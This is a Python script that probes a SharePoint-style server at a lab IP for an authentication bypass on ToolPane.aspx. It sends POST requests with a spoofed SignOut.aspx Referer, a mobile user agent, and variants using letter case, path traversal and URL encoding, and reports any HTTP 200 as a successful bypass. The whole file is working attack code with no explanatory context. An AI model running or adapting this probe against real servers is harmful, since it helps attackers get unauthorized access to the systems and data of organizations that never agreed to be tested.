# Test advanced bypass techniques
# Purpose: Check case variations, path traversal, and referer variations

import requests

base_url = "http://10.10.10.166"
test_body = "test=data"

mobile_ua = "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3"

test_cases = [
    # Case variations of ToolPane.aspx
    ("Case: toolpane.aspx", "/_layouts/15/toolpane.aspx?DisplayMode=Edit", "/_layouts/SignOut.aspx"),
    ("Case: TOOLPANE.ASPX", "/_layouts/15/TOOLPANE.ASPX?DisplayMode=Edit", "/_layouts/SignOut.aspx"),
    ("Case: ToOlPaNe.AsPx", "/_layouts/15/ToOlPaNe.AsPx?DisplayMode=Edit", "/_layouts/SignOut.aspx"),
    
    # Path traversal on ToolPane.aspx
    ("Traversal: /./ToolPane.aspx", "/_layouts/15/./ToolPane.aspx?DisplayMode=Edit", "/_layouts/SignOut.aspx"),
    ("Traversal: /../15/ToolPane.aspx", "/_layouts/../_layouts/15/ToolPane.aspx?DisplayMode=Edit", "/_layouts/SignOut.aspx"),
    
    # Referer variations
    ("Referer: /SignOut.aspx (no _layouts)", "/_layouts/15/ToolPane.aspx?DisplayMode=Edit", "/SignOut.aspx"),
    ("Referer: /_layouts/15/SignOut.aspx", "/_layouts/15/ToolPane.aspx?DisplayMode=Edit", "/_layouts/15/SignOut.aspx"),
    ("Referer: Case variation SIGNOUT", "/_layouts/15/ToolPane.aspx?DisplayMode=Edit", "/_layouts/SIGNOUT.aspx"),
    
    # Try ToolPane with foo parameter pointing to different page
    ("foo param: Error.aspx", "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/Error.aspx", "/_layouts/SignOut.aspx"),
    
    # URL encoding bypasses
    ("URL encode: %54oolPane.aspx", "/_layouts/15/%54oolPane.aspx?DisplayMode=Edit", "/_layouts/SignOut.aspx"),
]

for name, endpoint, referer in test_cases:
    print(f"\n[*] Testing: {name}")
    print(f"    Endpoint: {endpoint}")
    print(f"    Referer: {referer}")
    
    headers = {
        "User-Agent": mobile_ua,
        "Referer": referer,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        response = requests.post(f"{base_url}{endpoint}", headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    *** BYPASS SUCCESSFUL! ***")
    except Exception as e:
        print(f"    Error: {e}")
